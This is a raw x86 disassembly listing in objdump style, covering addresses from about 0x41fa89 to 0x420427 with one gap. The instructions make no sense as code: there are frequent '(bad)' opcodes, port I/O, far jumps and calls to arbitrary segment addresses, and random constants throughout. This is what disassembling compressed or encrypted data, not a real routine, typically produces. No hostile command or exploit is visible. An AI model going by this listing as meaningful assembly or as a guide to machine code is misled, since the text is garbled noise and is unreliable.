  41fa89:	jecxz  0x41fa73
  41fa8b:	(bad)  
  41fa8c:	xchg   ebx,eax
  41fa8d:	cmp    BYTE PTR [esi-0x55f10672],dh
  41fa93:	lea    edi,[ebx]
  41fa95:	mov    BYTE PTR ss:[edi+esi*2+0x724e2f0c],cl
  41fa9d:	mov    WORD PTR [ecx-0x21],?
  41faa0:	mov    ds:0xf1293b0e,al
  41faa5:	fbstp  TBYTE PTR [edi+0x15516170]
  41faab:	mov    dl,0xd7
  41faad:	lahf   
  41faae:	aaa    
  41faaf:	jge    0x41fb2f
  41fab1:	pop    edi
  41fab2:	dec    esp
  41fab3:	sbb    BYTE PTR [ecx-0x27],dl
  41fab6:	inc    esi
  41fab7:	aas    
  41fab8:	js     0x41fa4b
  41faba:	pop    esp
  41fabb:	nop
  41fabc:	aaa    
  41fabd:	into   
  41fabe:	(bad)  
  41fabf:	int3   
  41fac0:	sbb    al,0x86
  41fac2:	adc    dl,BYTE PTR [edi]
  41fac4:	sbb    ebp,esp
  41fac6:	mov    dh,0xf4
  41fac8:	loop   0x41fb16
  41faca:	sbb    al,0x4b
  41facc:	cmp    eax,0x1bc56b46
  41fad1:	sub    eax,0xd7e8b02f
  41fad6:	pop    edx
  41fad7:	add    esp,DWORD PTR [esi-0x367f89e6]
  41fadd:	jns    0x41fa6c
  41fadf:	mov    bh,BYTE PTR [ecx+0x8]
  41fae2:	fldcw  WORD PTR [ebx+0x7e]
  41fae5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fae6:	adc    bh,BYTE PTR [eax]
  41fae8:	xor    al,0x3f
  41faea:	jle    0x41fa83
  41faec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41faed:	leave  
  41faee:	pop    es
  41faef:	sbb    BYTE PTR ds:0xfe5d3455,ch
  41faf5:	retf   
  41faf6:	xor    eax,0xe3c4bbf3
  41fafb:	(bad)  
  41fafc:	dec    ebp
  41fafd:	mov    ah,0xcc
  41faff:	(bad)  
  41fb00:	jl     0x41fa8d
  41fb02:	lahf   
  41fb03:	fidivr DWORD PTR [ebp+0x6c]
  41fb06:	repnz adc DWORD PTR [ecx],ecx
  41fb09:	cmp    BYTE PTR [ecx+0x6f],bl
  41fb0c:	cmp    al,0xb5
  41fb0e:	icebp  
  41fb0f:	test   al,0x58
  41fb11:	shl    DWORD PTR [edx-0x5ff5087d],0xfc
  41fb18:	jnp    0x41fb7f
  41fb1a:	mov    edi,0x6bc423b2
  41fb1f:	fstp   DWORD PTR [esi-0x42c6f344]
  41fb25:	sub    eax,0x337b4b65
  41fb2a:	mov    ah,0xda
  41fb2c:	and    esi,DWORD PTR [ebx+0x72fa2871]
  41fb32:	or     ch,BYTE PTR [edi-0x5e]
  41fb35:	sbb    BYTE PTR [esi+0x71e199a4],al
  41fb3b:	inc    edi
  41fb3c:	leave  
  41fb3d:	lock add BYTE PTR [ebp+eax*2-0xe058688],0x65
  41fb46:	ret    0xe214
  41fb49:	sub    ch,BYTE PTR [esi]
  41fb4b:	inc    edi
  41fb4c:	dec    esp
  41fb4d:	ins    DWORD PTR es:[edi],dx
  41fb4e:	and    esi,DWORD PTR [edi-0x77]
  41fb51:	pop    ss
  41fb52:	jbe    0x41fb98
  41fb54:	push   esi
  41fb55:	scas   al,BYTE PTR es:[edi]
  41fb56:	and    ebp,DWORD PTR [ebx-0x4737331]
  41fb5c:	stos   BYTE PTR es:[edi],al
  41fb5d:	adc    eax,0x1ecda09b
  41fb62:	adc    DWORD PTR [edi+esi*2-0x9ed666a],esp
  41fb69:	jge    0x41fb66
  41fb6b:	mov    BYTE PTR [ebx+0x5418b62c],bl
  41fb71:	imul   ecx,DWORD PTR [edi-0x5409069a],0xc96e5d52
  41fb7b:	xchg   DWORD PTR [ebx-0x158caaf4],edx
  41fb81:	pop    esi
  41fb82:	sbb    DWORD PTR [edx-0x62],ebx
  41fb85:	or     eax,0xe04d14c7
  41fb8a:	enter  0x2709,0x91
  41fb8e:	lock inc ebx
  41fb90:	jb     0x41fbb0
  41fb92:	ja     0x41fc01
  41fb94:	(bad)  
  41fb95:	jecxz  0x41fb5b
  41fb97:	repnz dec edx
  41fb99:	loopne 0x41fb8b
  41fb9b:	inc    ebp
  41fb9c:	adc    eax,0x561fc6fe
  41fba1:	retf   0xfd46
  41fba4:	mul    esi
  41fba6:	in     al,dx
  41fba7:	or     eax,0x4f6f2b47
  41fbac:	mov    bh,0x5b
  41fbae:	adc    ebp,DWORD PTR [ebx]
  41fbb0:	cmp    al,0x5a
  41fbb2:	xchg   esp,eax
  41fbb3:	gs scas eax,DWORD PTR es:[edi]
  41fbb5:	xor    DWORD PTR [ecx-0x71ec5949],edi
  41fbbb:	or     DWORD PTR [ebp-0x47],ebp
  41fbbe:	daa    
  41fbbf:	sbb    bh,ch
  41fbc1:	test   DWORD PTR [esi+ebp*8+0xcb13eac],esi
  41fbc8:	scas   eax,DWORD PTR es:[edi]
  41fbc9:	adc    BYTE PTR [edx+0xfc52d28],bh
  41fbcf:	mov    ebx,0xdd9c8aec
  41fbd4:	lea    edi,[edx+0xb5d0ad0]
  41fbda:	scas   al,BYTE PTR es:[edi]
  41fbdb:	mov    ds:0x42450033,al
  41fbe0:	scas   eax,DWORD PTR es:[edi]
  41fbe1:	pop    esi
  41fbe2:	sbb    eax,0x88722713
  41fbe7:	inc    edx
  41fbe8:	inc    edi
  41fbe9:	inc    esi
  41fbea:	pop    ebp
  41fbeb:	stos   BYTE PTR es:[edi],al
  41fbec:	hlt    
  41fbed:	(bad)  
  41fbee:	mov    esi,0x550778a8
  41fbf3:	enter  0x55c8,0xc8
  41fbf7:	daa    
  41fbf8:	sub    al,0x19
  41fbfa:	jb     0x41fc35
  41fbfc:	dec    edi
  41fbfd:	sbb    BYTE PTR [eax],dh
  41fbff:	jmp    0xdbef:0x71dc71c3
  41fc06:	or     BYTE PTR [eax+0x3c],bh
  41fc09:	rol    BYTE PTR [edi],0x85
  41fc0c:	xchg   ecx,eax
  41fc0d:	ret    
  41fc0e:	out    0x61,eax
  41fc10:	test   al,0x72
  41fc12:	loope  0x41fc87
  41fc14:	sub    ecx,edi
  41fc16:	popf   
  41fc17:	in     al,0x6f
  41fc19:	(bad)  
  41fc1a:	push   cs
  41fc1b:	dec    ecx
  41fc1c:	lea    ecx,[edx]
  41fc1e:	pop    ss
  41fc1f:	sub    ebp,ecx
  41fc21:	mov    WORD PTR [ecx-0x6d],?
  41fc24:	imul   esi,DWORD PTR [ecx+0x7f],0x71
  41fc28:	imul   ecx,ecx,0x1c30992b
  41fc2e:	lock add DWORD PTR [edx+0x46],0x29
  41fc33:	pop    ebp
  41fc34:	mov    bl,0x7b
  41fc36:	fidivr WORD PTR [esi+0x7a]
  41fc39:	mov    ds:0xeb7637c6,al
  41fc3e:	ins    DWORD PTR es:[edi],dx
  41fc3f:	mov    ebp,0x5302119e
  41fc44:	js     0x41fc30
  41fc46:	pop    es
  41fc47:	ret    0xaddf
  41fc4a:	mov    BYTE PTR [edi-0x63],dh
  41fc4d:	pop    edi
  41fc4e:	mov    ebx,0xe5c721b4
  41fc53:	and    DWORD PTR ds:0xb3e490f5,0x34
  41fc5a:	or     esi,DWORD PTR [ebp-0x4d]
  41fc5d:	jo     0x41fc0b
  41fc5f:	jmp    0x9398bb84
  41fc64:	sub    DWORD PTR [eax],0xfffffff9
  41fc67:	inc    ebp
  41fc68:	jo     0x41fcd6
  41fc6a:	data16 mov ?,WORD PTR [ebx-0x72]
  41fc6e:	in     eax,0x56
  41fc70:	inc    edi
  41fc71:	and    BYTE PTR [ecx+esi*1+0x52],bl
  41fc75:	int3   
  41fc76:	stos   BYTE PTR es:[edi],al
  41fc77:	dec    DWORD PTR [ecx+0x1c]
  41fc7a:	pusha  
  41fc7b:	(bad)  
  41fc7c:	lea    esp,[ebx]
  41fc7e:	ins    DWORD PTR es:[edi],dx
  41fc7f:	or     cl,BYTE PTR [esi+0x45]
  41fc82:	mov    dh,0x65
  41fc84:	adc    DWORD PTR [eax+edx*2+0x333667a2],ebx
  41fc8b:	leave  
  41fc8c:	das    
  41fc8d:	scas   al,BYTE PTR es:[edi]
  41fc8e:	push   0xffffff8e
  41fc90:	ror    eax,0xcb
  41fc93:	mov    ch,0xfe
  41fc95:	or     eax,0x7729f004
  41fc9a:	xchg   esi,eax
  41fc9b:	push   esi
  41fc9c:	jbe    0x41fcf3
  41fc9e:	mul    BYTE PTR [esi+0x6b3a972a]
  41fca4:	xlat   BYTE PTR ds:[ebx]
  41fca5:	xchg   edi,eax
  41fca6:	in     al,0xd4
  41fca8:	enter  0x17fd,0xb9
  41fcac:	jmp    0x41fcb1
	...
  41fe7d:	mov    ?,WORD PTR [ebp-0x1b]
  41fe80:	in     al,dx
  41fe81:	idiv   esp
  41fe83:	(bad)  
  41fe84:	jg     0x41fef8
  41fe86:	and    eax,0xbdfa1474
  41fe8b:	xor    al,0xe6
  41fe8d:	pop    ebx
  41fe8e:	lds    eax,FWORD PTR [ecx]
  41fe90:	add    BYTE PTR [eax],ah
  41fe92:	pop    es
  41fe93:	add    BYTE PTR [eax],al
  41fe95:	nop
  41fe96:	mov    bl,0x17
  41fe98:	mov    esp,0x969a217b
  41fe9d:	xchg   DWORD PTR [ebp+0x4c],edi
  41fea0:	(bad)  
  41fea1:	and    DWORD PTR [ebx],edx
  41fea3:	pusha  
  41fea4:	bound  ecx,QWORD PTR [ecx]
  41fea6:	addr16 and cl,bh
  41fea9:	mov    edx,0x7aaee620
  41feae:	enter  0x38f5,0xbc
  41feb2:	and    cl,al
  41feb4:	mov    ds:0xf6b08ade,al
  41feb9:	cld    
  41feba:	pextrw edx,(bad),0xc5
  41febc:	push   ss
  41febd:	jne    0x41fe5d
  41febf:	and    BYTE PTR [esi+ebx*4],bl
  41fec2:	enter  0xed0d,0xe6
  41fec6:	or     al,0x9b
  41fec8:	sbb    BYTE PTR [edx-0x75],al
  41fecb:	and    ch,BYTE PTR [edx+ecx*4-0x69b3276d]
  41fed2:	or     al,0xb6
  41fed4:	xchg   ebx,eax
  41fed5:	mov    edx,0x30367483
  41feda:	and    eax,0xa61f6caf
  41fedf:	repz or DWORD PTR [ebp-0x2b2bc1a3],edx
  41fee6:	fst    st(1)
  41fee8:	call   0xbf11:0x9f9d4c93
  41feef:	mov    cl,0xad
  41fef1:	ja     0x41fecd
  41fef3:	push   ds
  41fef4:	jb     0x41fee7
  41fef6:	fst    DWORD PTR [eax-0x7264614a]
  41fefc:	dec    ebp
  41fefd:	inc    eax
  41fefe:	retfw  0x693e
  41ff02:	adc    BYTE PTR [ecx+0x6f],al
  41ff05:	fisttp DWORD PTR [ecx+0xbe90b74]
  41ff0b:	in     eax,0x49
  41ff0d:	pop    ebp
  41ff0e:	cli    
  41ff0f:	sub    DWORD PTR [ebp+0x797e050],edi
  41ff15:	clc    
  41ff16:	mov    bh,0xec
  41ff18:	shl    edx,0x9a
  41ff1b:	sub    eax,0x3debb387
  41ff20:	push   ecx
  41ff21:	stos   DWORD PTR es:[di],eax
  41ff23:	or     bl,BYTE PTR [ecx-0x4a]
  41ff26:	js     0x41ffa0
  41ff28:	(bad)  
  41ff29:	mov    al,ds:0x2a89a8c0
  41ff2e:	cmp    esi,edi
  41ff30:	push   eax
  41ff31:	xlat   BYTE PTR ds:[ebx]
  41ff32:	icebp  
  41ff33:	sub    BYTE PTR [eax],dl
  41ff35:	cli    
  41ff36:	dec    ecx
  41ff37:	jecxz  0x41feed
  41ff39:	out    dx,al
  41ff3a:	fmul   DWORD PTR [edx]
  41ff3c:	jne    0x41ff9d
  41ff3e:	cmp    eax,0x73283ab6
  41ff43:	add    ebx,DWORD PTR [edx+0x39f1f6f]
  41ff49:	jnp    0x41ffc3
  41ff4b:	pop    edi
  41ff4c:	push   ss
  41ff4d:	mov    edi,0x1691683c
  41ff52:	add    DWORD PTR [eax-0x30394b85],ebx
  41ff58:	xor    edi,DWORD PTR [esi-0x2a]
  41ff5b:	mov    al,0x70
  41ff5d:	push   ecx
  41ff5e:	dec    esp
  41ff5f:	mov    esp,0xdf9eaab7
  41ff64:	fdivp  st(2),st
  41ff66:	loopne 0x41ff0a
  41ff68:	addr16 retf 0x580b
  41ff6c:	jg     0x41ff88
  41ff6e:	mov    cl,0xf7
  41ff70:	mov    WORD PTR [ebx+0xa],ds
  41ff73:	pop    ds
  41ff74:	mov    edi,0xeec10fa0
  41ff79:	fnstenv [edi]
  41ff7b:	push   cs
  41ff7c:	mov    ah,0x41
  41ff7e:	push   esi
  41ff7f:	add    BYTE PTR [edx],0x96
  41ff82:	pop    esi
  41ff83:	test   eax,0x4fa40206
  41ff88:	fisubr WORD PTR [ecx]
  41ff8a:	in     al,0x72
  41ff8c:	xchg   ecx,eax
  41ff8d:	lahf   
  41ff8e:	icebp  
  41ff8f:	data16 jb 0x41fff0
  41ff92:	aas    
  41ff93:	or     ebx,DWORD PTR [ebp+0x10fe918b]
  41ff99:	jg     0x41ffe2
  41ff9b:	stos   DWORD PTR es:[edi],eax
  41ff9c:	mov    dl,0x66
  41ff9e:	neg    dh
  41ffa0:	xor    DWORD PTR [ecx+0x6cf7bc82],edx
  41ffa6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ffa7:	jmp    0x35d:0xacff7f1
  41ffae:	ins    DWORD PTR es:[edi],dx
  41ffaf:	cs add al,0xd9
  41ffb2:	out    0xf2,al
  41ffb4:	jnp    0x41ff77
  41ffb6:	push   0x78bc29f2
  41ffbb:	repz in al,0xc2
  41ffbe:	jl     0x41ff98
  41ffc0:	bound  eax,QWORD PTR [edi+0x50]
  41ffc3:	aam    0x19
  41ffc5:	push   0x32
  41ffc7:	lea    ecx,[edx-0x69]
  41ffca:	fmul   QWORD PTR ds:0x75de0574
  41ffd0:	mov    ah,0x9
  41ffd2:	lods   eax,DWORD PTR ds:[esi]
  41ffd3:	loop   0x41fffa
  41ffd5:	out    0x59,eax
  41ffd7:	jmp    0xf9117f01
  41ffdc:	idiv   DWORD PTR [eax]
  41ffde:	jle    0x41ff9e
  41ffe0:	mov    ds:0xc95e234a,al
  41ffe5:	jle    0x41ff6d
  41ffe7:	fwait
  41ffe8:	ret    0x7d38
  41ffeb:	or     ecx,esp
  41ffed:	sub    DWORD PTR [esi+0x2b42f5],edi
  41fff3:	jno    0x41ffe9
  41fff5:	xchg   edi,eax
  41fff6:	xchg   esp,eax
  41fff7:	mov    edi,0x47d00181
  41fffc:	into   
  41fffd:	sbb    cl,BYTE PTR [eax]
  41ffff:	adc    al,0x37
  420001:	sbb    esp,DWORD PTR [edx+0x15]
  420004:	dec    edi
  420005:	out    dx,al
  420006:	adc    dh,cl
  420008:	xor    al,0x0
  42000a:	push   ss
  42000b:	mov    eax,ds:0x55521c91
  420010:	jbe    0x420051
  420012:	bound  esp,QWORD PTR [eax-0x9]
  420015:	pushf  
  420016:	push   eax
  420017:	enter  0x1647,0x64
  42001b:	and    al,0x38
  42001d:	cmc    
  42001e:	mov    al,ds:0xdef99e95
  420023:	lahf   
  420024:	or     BYTE PTR [ecx-0x14a0669],dl
  42002a:	stos   BYTE PTR es:[edi],al
  42002b:	push   esi
  42002c:	out    0x2f,al
  42002e:	imul   esi,DWORD PTR [eax-0x51],0xf6075997
  420035:	sahf   
  420036:	mov    al,ah
  420038:	mov    al,0x82
  42003a:	fadd   QWORD PTR [ebx+0x197f2ea8]
  420040:	mov    ds:0x6189c0aa,eax
  420045:	jmp    0x42003b
  420047:	jecxz  0x4200ad
  420049:	jbe    0x42007d
  42004b:	andps  xmm3,XMMWORD PTR [ebx+eiz*8]
  42004f:	or     esi,edi
  420051:	mov    bh,0x8c
  420053:	sbb    eax,0xf14ff865
  420058:	es add ebp,edi
  42005b:	mov    esi,0xab56f9e4
  420060:	pop    ebp
  420061:	test   BYTE PTR [edi-0x7511bb9],ah
  420067:	mov    eax,DWORD PTR [ebx*8+0x5cc05e74]
  42006e:	test   bh,0x83
  420071:	lds    edi,FWORD PTR [edx]
  420073:	into   
  420074:	pop    es
  420075:	mov    esp,0xa5c4ff17
  42007a:	or     bh,ch
  42007c:	jg     0x42004b
  42007e:	pop    eax
  42007f:	and    edx,edi
  420081:	add    al,0x83
  420083:	out    dx,al
  420084:	cmp    cl,BYTE PTR [edx+0x61]
  420087:	and    eax,0x762544b7
  42008c:	cmp    al,0xf7
  42008e:	adc    DWORD PTR [edx+0x27cc375],ebp
  420094:	lock jmp 0x29b5c53b
  42009a:	adc    al,0x5b
  42009c:	mov    BYTE PTR [ebp+0x4f],al
  42009f:	fsubr  st,st(1)
  4200a1:	inc    edi
  4200a2:	jecxz  0x42009f
  4200a4:	rcr    DWORD PTR [edx+0x3f],0x93
  4200a8:	iret   
  4200a9:	add    bh,BYTE PTR [edi]
  4200ab:	xchg   ebx,eax
  4200ac:	jle    0x420034
  4200ae:	pop    ds
  4200af:	in     al,0x40
  4200b1:	adc    ebx,esp
  4200b3:	loopne 0x420052
  4200b5:	ins    BYTE PTR es:[edi],dx
  4200b6:	mov    DWORD PTR [edx],esp
  4200b8:	sbb    eax,0xa2776395
  4200bd:	sbb    BYTE PTR [edx-0x2d],dh
  4200c0:	lods   al,BYTE PTR ds:[esi]
  4200c1:	jle    0x420081
  4200c3:	dec    edx
  4200c4:	inc    esi
  4200c5:	pop    ebp
  4200c6:	adc    eax,0x32e57073
  4200cb:	cdq    
  4200cc:	call   esi
  4200ce:	and    al,0x3e
  4200d0:	sahf   
  4200d1:	out    dx,al
  4200d2:	sub    BYTE PTR [ebx+0x15],ah
  4200d5:	jns    0x420096
  4200d7:	sahf   
  4200d8:	aad    0xd
  4200da:	fwait
  4200db:	pop    ss
  4200dc:	or     dh,BYTE PTR ds:0x7c360b3e
  4200e2:	retf   
  4200e3:	mov    dl,0xd3
  4200e5:	cmc    
  4200e6:	ins    BYTE PTR es:[edi],dx
  4200e7:	fsub   DWORD PTR [eax-0x4397674]
  4200ee:	push   eax
  4200ef:	aam    0x6a
  4200f1:	push   ss
  4200f2:	lea    edi,[ecx]
  4200f4:	or     DWORD PTR [eax],0x1c4f464
  4200fa:	adc    eax,0xa8854700
  4200ff:	or     DWORD PTR ds:0x2074ecb9,ebx
  420105:	call   0xcb11ae0f
  42010a:	inc    esi
  42010b:	(bad)  
  42010c:	jp     0x4200f0
  42010e:	cmp    BYTE PTR [esi+0xfb2e2ca],ah
  420114:	sahf   
  420115:	dec    ebx
  420116:	jmp    0x420197
  420118:	jno    0x4200a1
  42011a:	fnstsw WORD PTR [ebx]
  42011c:	dec    edx
  42011d:	mov    fs,WORD PTR [ebx+0x194f8c34]
  420123:	and    edi,DWORD PTR ds:0x89c3b2da
  420129:	les    edi,FWORD PTR [ebp+0x3bf9de1e]
  42012f:	dec    edi
  420130:	pop    esi
  420131:	pushf  
  420132:	retf   0xb35d
  420135:	jb     0x4200ed
  420137:	xchg   cl,ch
  420139:	rol    DWORD PTR [eax-0x41],cl
  42013c:	lods   eax,DWORD PTR ds:[esi]
  42013d:	sub    BYTE PTR [esi+0x28],al
  420140:	and    BYTE PTR [ebp+0x4e],bh
  420143:	jne    0x4201c0
  420145:	mov    ch,0x45
  420147:	pop    es
  420148:	imul   ebx,DWORD PTR [edi+0x66c3e68d],0xf
  42014f:	js     0x42017b
  420151:	sub    dh,bl
  420153:	push   ecx
  420154:	dec    ebp
  420155:	out    0x8c,eax
  420157:	pop    es
  420158:	in     al,dx
  420159:	mov    al,0x7f
  42015b:	enter  0x6d32,0xc9
  42015f:	add    BYTE PTR [ebx-0x32533593],al
  420165:	repz pop ebp
  420167:	icebp  
  420168:	adc    eax,0x21f94801
  42016d:	xchg   BYTE PTR [edi+0x50],cl
  420170:	pop    ecx
  420171:	lds    ebp,FWORD PTR [ebp+0x59]
  420174:	or     ah,BYTE PTR [ebp+0x192cb3d]
  42017a:	(bad)  
  42017b:	sti    
  42017c:	pop    edi
  42017d:	adc    al,0xd
  42017f:	mov    esp,0x3aff7f2a
  420184:	(bad)  
  420186:	mov    dl,0x27
  420188:	inc    esi
  420189:	les    ebx,FWORD PTR [ecx]
  42018b:	imul   edx,DWORD PTR [ebx+0x58],0x37
  42018f:	xchg   ecx,eax
  420190:	adc    al,0x9f
  420192:	push   ebx
  420193:	into   
  420194:	leave  
  420195:	lods   eax,DWORD PTR ds:[esi]
  420196:	or     esp,ebx
  420198:	xor    eax,edx
  42019a:	mov    ecx,esi
  42019c:	sbb    BYTE PTR [ebx+0x65c053ce],bl
  4201a2:	fild   WORD PTR [ebp+0x5e6ec462]
  4201a8:	push   gs
  4201aa:	jnp    0x42019f
  4201ac:	sub    eax,0x646b5320
  4201b1:	mov    eax,DWORD PTR [edx+esi*4+0x11e269]
  4201b8:	mov    eax,0xb451a94e
  4201bd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4201be:	ja     0x42018a
  4201c0:	adc    edi,0xffffffba
  4201c3:	mov    dh,0x2e
  4201c5:	stc    
  4201c6:	inc    ebx
  4201c7:	loop   0x42014d
  4201c9:	dec    eax
  4201ca:	(bad)  
  4201cb:	rcr    esi,1
  4201cd:	call   0x907e:0x853ec713
  4201d4:	hlt    
  4201d5:	mov    ah,0x67
  4201d7:	push   ebp
  4201d8:	bound  ebp,QWORD PTR [ecx]
  4201da:	sbb    bh,BYTE PTR [edx+0x3e491473]
  4201e0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4201e1:	sbb    eax,0xbe0934a3
  4201e6:	add    eax,0x57a9d7b0
  4201eb:	out    dx,al
  4201ec:	xchg   ebx,eax
  4201ed:	fs cmp dh,dl
  4201f0:	sub    BYTE PTR [ebp+0x4b7d2602],dl
  4201f6:	cmp    DWORD PTR [edx+0x52],edx
  4201f9:	xchg   edi,eax
  4201fa:	push   edi
  4201fb:	jae    0x420223
  4201fd:	aas    
  4201fe:	stos   DWORD PTR es:[edi],eax
  4201ff:	add    BYTE PTR [ecx],cl
  420201:	inc    edi
  420202:	or     ebp,DWORD PTR [edx+0x7c]
  420205:	push   ss
  420206:	jo     0x4201aa
  420208:	mov    ebp,0xbe15d120
  42020d:	dec    edi
  42020e:	pop    ebp
  42020f:	adc    ch,BYTE PTR [ebx+esi*4]
  420212:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420213:	in     eax,dx
  420214:	jbe    0x4201ec
  420216:	add    dh,BYTE PTR [edi-0x3153c962]
  42021c:	mov    edi,0x168b374f
  420221:	and    eax,0x72f8d384
  420226:	fisubr DWORD PTR [ebx-0x209287aa]
  42022c:	mov    cl,BYTE PTR [eax+eiz*4-0x3a74080b]
  420233:	cmc    
  420234:	mov    bh,0xad
  420237:	(bad)  
  420238:	xchg   esi,eax
  420239:	fsub   DWORD PTR [ecx+0x67]
  42023c:	xor    BYTE PTR [edi-0x41e9189b],ah
  420242:	pop    esi
  420243:	(bad)  
  420244:	shr    BYTE PTR [ecx-0x7acb9b54],cl
  42024a:	pop    ss
  42024b:	call   0x4398:0xd2826209
  420252:	mov    ebx,0xac7b4256
  420257:	cli    
  420258:	adc    eax,0xaaba3bc2
  42025d:	adc    esp,DWORD PTR [esi+esi*8-0x4a]
  420261:	in     eax,0xbc
  420263:	and    al,0x44
  420265:	cdq    
  420266:	sub    ah,bl
  420268:	cwde   
  420269:	cwde   
  42026a:	dec    edi
  42026b:	jns    0x420266
  42026d:	pop    esi
  42026e:	fwait
  42026f:	lds    ebx,FWORD PTR [ebp-0x44e505d4]
  420275:	mov    ebp,0xf831cd7f
  42027a:	test   eax,0xc414db32
  42027f:	adc    ah,cl
  420281:	sti    
  420282:	aas    
  420283:	daa    
  420284:	xchg   bh,al
  420286:	inc    eax
  420287:	pushf  
  420288:	mov    dl,0xf9
  42028a:	mov    ebp,0x40e8fc5
  42028f:	dec    ecx
  420290:	jmp    0xe71d:0x3879666a
  420297:	and    BYTE PTR [ebx],dl
  420299:	mov    eax,ds:0x202a5971
  42029e:	cmp    DWORD PTR [esi-0x375e30c],eax
  4202a4:	lods   al,BYTE PTR ds:[esi]
  4202a5:	leave  
  4202a6:	test   DWORD PTR [ebx+esi*2+0x12],0x107df27a
  4202ae:	add    al,0xc5
  4202b0:	xchg   edx,eax
  4202b1:	pop    eax
  4202b2:	arpl   WORD PTR [ecx],si
  4202b4:	rcl    DWORD PTR ss:[ebx+0x23ccdb17],cl
  4202bb:	fiadd  DWORD PTR [ecx]
  4202bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4202be:	pop    eax
  4202bf:	jns    0x4202ab
  4202c1:	add    al,0x3f
  4202c3:	sbb    DWORD PTR [ebp+esi*1+0x65d1fa31],0xffffff8f
  4202cb:	xor    eax,0xd5249375
  4202d0:	push   ss
  4202d1:	pop    ebx
  4202d2:	js     0x420324
  4202d4:	cmp    bh,BYTE PTR [edi+eiz*4+0x36f990bc]
  4202db:	repnz aad 0xf0
  4202de:	ins    BYTE PTR es:[edi],dx
  4202df:	bound  esp,QWORD PTR [ebp-0x5]
  4202e2:	pushf  
  4202e3:	dec    ebx
  4202e4:	repz fs call 0x6f572840
  4202eb:	and    bl,cl
  4202ed:	aam    0x1c
  4202ef:	stos   BYTE PTR es:[edi],al
  4202f0:	cmp    bh,BYTE PTR [ebp+0x39]
  4202f3:	(bad)  
  4202f4:	sub    ebp,ebx
  4202f6:	fstp   DWORD PTR ds:0xaacbe07a
  4202fc:	mov    esp,0x6af41ea3
  420301:	in     eax,dx
  420302:	jg     0x4202ed
  420304:	popf   
  420305:	jp     0x42036e
  420307:	mov    eax,ds:0xb7768e0f
  42030c:	jg     0x42035c
  42030e:	xchg   ecx,eax
  42030f:	jmp    0x2a0e281f
  420314:	or     edi,DWORD PTR [eax+0xc]
  420317:	scas   eax,DWORD PTR es:[edi]
  420318:	add    ebp,DWORD PTR [ecx-0x2cb6356f]
  42031e:	imul   eax,edi,0x47f963c
  420324:	ret    0x1e9a
  420327:	out    dx,al
  420328:	xor    esp,esi
  42032a:	xlat   BYTE PTR ds:[ebx]
  42032b:	mov    al,bh
  42032d:	inc    ecx
  42032e:	stc    
  42032f:	dec    ebx
  420330:	xchg   BYTE PTR [ecx-0x34],bh
  420333:	fs jg  0x42036f
  420336:	aad    0xce
  420338:	sahf   
  420339:	jmp    0x37eb:0xd36bf50
  420340:	and    BYTE PTR [ebx-0x275f64be],dl
  420346:	(bad)  
  420347:	sahf   
  420348:	inc    edi
  420349:	jns    0x420328
  42034b:	or     ebp,esi
  42034d:	add    DWORD PTR [esi+0x727bdf2a],ecx
  420353:	inc    ecx
  420354:	and    DWORD PTR [edx+0x2b7e0f4d],0x5f
  42035b:	pushf  
  42035c:	fdivr  DWORD PTR [edi]
  42035e:	in     eax,0xf
  420360:	lea    eax,[ebx+eiz*4]
  420363:	mov    ah,0x13
  420365:	scas   al,BYTE PTR es:[edi]
  420366:	sbb    BYTE PTR [ecx+0x27],dl
  420369:	lahf   
  42036a:	addr16 sub eax,0x360bfd15
  420370:	mov    eax,ds:0xcf27e690
  420375:	push   esp
  420376:	sbb    bl,cl
  420378:	mov    edx,0xf3c065cc
  42037d:	add    DWORD PTR [ecx+0x7ac6a9ba],esp
  420383:	test   BYTE PTR [eax],cl
  420385:	push   0x33a1f7c1
  42038a:	push   ss
  42038b:	or     BYTE PTR [edx+0x2441b6bd],ah
  420391:	jle    0x4203c8
  420393:	adc    al,BYTE PTR [eax+0x38fe7904]
  420399:	repz add ebp,DWORD PTR [ecx+0x51]
  42039d:	hlt    
  42039e:	into   
  42039f:	mov    dl,0xe1
  4203a1:	inc    ecx
  4203a2:	mov    ch,0x75
  4203a4:	hlt    
  4203a5:	dec    ebx
  4203a6:	pusha  
  4203a7:	xor    eax,0xbb0f4f87
  4203ac:	adc    ebx,DWORD PTR [ecx]
  4203ae:	not    BYTE PTR [ecx+eax*2-0x34]
  4203b2:	ins    DWORD PTR es:[edi],dx
  4203b3:	pop    esi
  4203b4:	jns    0x4203d0
  4203b6:	in     eax,0xcc
  4203b8:	ss and cl,0x90
  4203bc:	cli    
  4203bd:	xchg   esp,eax
  4203be:	and    ebx,0x6b24b7e
  4203c4:	inc    esp
  4203c5:	popa   
  4203c6:	sbb    eax,0xfd7cede2
  4203cb:	call   0x344bdc7a
  4203d0:	outs   dx,BYTE PTR ds:[esi]
  4203d1:	fwait
  4203d2:	es out 0x99,eax
  4203d5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4203d6:	push   edi
  4203d7:	popa   
  4203d8:	mov    eax,ds:0xccf9b0c5
  4203dd:	dec    eax
  4203de:	aad    0x68
  4203e0:	aam    0x97
  4203e2:	(bad)  
  4203e3:	jl     0x42045d
  4203e5:	leave  
  4203e6:	and    al,0x3
  4203e8:	stos   BYTE PTR es:[edi],al
  4203e9:	xor    eax,DWORD PTR [eax-0x15]
  4203ec:	(bad)  
  4203ed:	iret   
  4203ee:	dec    eax
  4203ef:	stc    
  4203f0:	mov    ecx,0xd244f91b
  4203f5:	out    0xe0,eax
  4203f7:	mov    cl,0xc8
  4203f9:	mov    dl,0x55
  4203fb:	add    esp,DWORD PTR [ecx+0x73374b3e]
  420401:	sub    BYTE PTR [ebp-0x45],ch
  420404:	mov    cl,0xa0
  420406:	pop    ss
  420407:	inc    ebp
  420408:	das    
  420409:	mov    edx,0xcb971f51
  42040e:	push   ecx
  42040f:	pop    ss
  420410:	test   BYTE PTR [edx],bl
  420412:	icebp  
  420413:	mov    edi,0x112920cc
  420418:	in     al,dx
  420419:	js     0x420415
  42041b:	xchg   bl,bh
  42041d:	mov    cl,0x6b
  42041f:	loop   0x420418
  420421:	push   eax
  420422:	mov    esp,0xbe7d6d07
  420427:	sub    DWORD PTR [edi-0x4ddeeda5],ebp
